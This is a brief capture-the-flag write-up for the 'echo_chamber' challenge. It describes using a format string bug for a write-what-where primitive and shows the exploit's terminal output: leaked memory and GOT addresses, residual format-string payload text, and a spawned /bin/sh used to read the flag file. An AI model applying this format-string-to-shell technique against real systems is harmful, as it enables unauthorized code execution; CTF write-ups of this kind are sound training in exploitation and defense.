# echo_chamber

We solve this challenge using format string bug and implement write-what-where. The exploit sometimes doesn't work in local but always work to remote server.
```
% python exploit.py
[+] Opening connection to echochamber.uni.hctf.fun on port 13374: Done
0x565fc000
0xf7d38000
0xffdb6970
free_got 0x56600010
4158089456
[*] Paused (press any to continue)
<cut off>
                                                                                                                                           2;/bin/shsh: %35056x%26%28390x%27: not found
$ ls
bin
etc
lib
opt
usr
$ cat /opt/flag.txt
flag{something_with_tcache_ga48ghydgja}
```

The flag was `flag{something_with_tcache_ga48ghydgja}`, but we pop'd the shell using format string :P
